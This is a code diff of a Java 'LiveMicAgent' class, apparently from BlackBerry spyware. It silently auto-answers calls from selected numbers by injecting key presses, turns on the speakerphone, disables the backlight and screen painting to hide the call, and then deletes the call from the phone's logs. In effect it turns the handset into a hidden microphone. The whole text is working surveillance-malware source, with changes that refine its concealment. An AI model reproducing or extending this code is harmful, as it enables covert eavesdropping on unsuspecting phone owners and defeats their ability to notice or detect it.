@@ -67,7 +67,7 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
     String number;
     int volume;
     boolean autoanswer;
-    boolean suspended;
+    //boolean suspended;
     boolean backlight;
 
     /**
@@ -202,21 +202,21 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
         //#endif
 
         //#ifdef DEBUG
-        debug.info("    === callAnswered: " + phoneNumber + "===");
+        debug.info("======= callAnswered: " + phoneNumber + "===");
         //#endif
 
         if (!interestingNumber(callId, phoneNumber)) {
             return;
         }
 
-        MenuWalker.setLocaleStart();
+        
         //MenuWalker.walk(new String[] { "Activate Speakerphone" });
         MenuWalker.walk(new String[] { "Home Screen", "Return to Phone" });
 
         //MenuWalker.walk(new String[] { "Close" });
         MenuWalker.walk(new String[] { "Return to Phone" });
         MenuWalker.walk(new String[] { "Activate Speakerphone" });
-        MenuWalker.setLocaleEnd();
+        //MenuWalker.setLocaleEnd();
 
         //#ifdef DEBUG
         debug.trace("onCallAnswered: finished");
@@ -236,7 +236,7 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
         //#endif
 
         //#ifdef DEBUG
-        debug.info("    === callConnected: " + phoneNumber + " ===");
+        debug.info("======= callConnected: " + phoneNumber + " ===");
         //#endif      
 
         if (!interestingNumber(callId, phoneNumber)) {
@@ -289,7 +289,7 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
                 //#ifdef DEBUG
                 debug.trace("run: removePhoneCall");
                 //#endif
-                final int DELAY = 2000;
+                final int DELAY = 5000;
                 Utils.sleep(DELAY);
 
                 removePhoneCallFromFolder(PhoneLogs.FOLDER_NORMAL_CALLS);
@@ -369,32 +369,15 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
         }
 
         stopAudio();
-        /*
-         * try { Timer timer = new Timer(); timer.schedule(new StopAudio(),10);
-         * } catch (Exception ex) { //#ifdef DEBUG
-         * debug.error("onCallIncoming: " + ex); //#endif }
-         */
 
-        /*
-         * if (backlight) { //#ifdef DEBUG
-         * debug.info("Backlight enabled, killing incoming call"); //#endif
-         * KeyInjector.pressKey(Keypad.KEY_END); } else { //#ifdef DEBUG
-         * debug.info("Backlight disabled, accepting incoming call"); //#endif
-         * KeyInjector.pressKey(Keypad.KEY_SEND); }
-         */
-
-        if (DeviceInfo.getIdleTime() > MINIMUM_IDLE_TIME) {
-            suspendPainting(true);
+        if (DeviceInfo.getIdleTime() > MINIMUM_IDLE_TIME) {            
             KeyInjector.pressKey(Keypad.KEY_SEND);
         } else {
             KeyInjector.pressKey(Keypad.KEY_END);
         }
-
-    }
-
-    public void onCallInitiated(int callId, String phoneNumber) {
-        // TODO Auto-generated method stub
-
+        
+        Backlight.enable(false);
+        suspendPainting(true);
     }
 
     //boolean backlight;
@@ -440,10 +423,11 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
         }
 
         //#ifdef DEBUG
-        debug.trace("suspendPainting: " + suspend + " suspended: " + suspended);
+        debug.trace("suspendPainting: " + suspend );
         //#endif              
 
         synchronized (Application.getEventLock()) {
+            boolean suspended =  UiApplication.getUiApplication().isPaintingSuspended();
             if (suspended != suspend) {
                 try {
                     //#ifdef LIVE_MIC_ENABLED
@@ -454,7 +438,7 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
                     debug.error(ex);
                     //#endif
                 }
-                suspended = suspend;
+                //suspended = suspend;
             }
         }
     }
@@ -593,7 +577,7 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
             callingHistory.put(new Integer(callId), phoneNumber);
         }
 
-        onCallInitiated(callId, phoneNumber);
+        
     }
 
     public void callRemoved(int arg0) {
